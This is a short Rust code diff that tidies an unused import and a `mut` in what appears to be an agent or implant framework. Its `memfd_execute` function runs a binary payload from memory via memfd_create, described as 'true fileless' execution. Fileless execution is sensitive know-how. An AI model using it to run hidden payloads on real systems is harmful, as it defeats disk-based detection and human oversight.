@@ -10,7 +10,6 @@
 use crate::fileless::MemfdBinary;
 use tracing::{info, warn};
 use uuid::Uuid;
-use std::io::Write;
 
 /// Larva mission types.
 #[derive(Debug, Clone)]
@@ -168,7 +167,7 @@ impl LarvaFactory {
     /// Execute a binary payload via memfd_create (true fileless).
     /// Returns the child PID on success.
     pub fn memfd_execute(name: &str, payload: &[u8], envs: &[(&str, &str)]) -> Result<u32, String> {
-        let mut memfd = MemfdBinary::new(name, payload)
+        let memfd = MemfdBinary::new(name, payload)
             .map_err(|e| format!("memfd_create: {}", e))?;
         let _ = memfd.seal();
         memfd.spawn(envs)
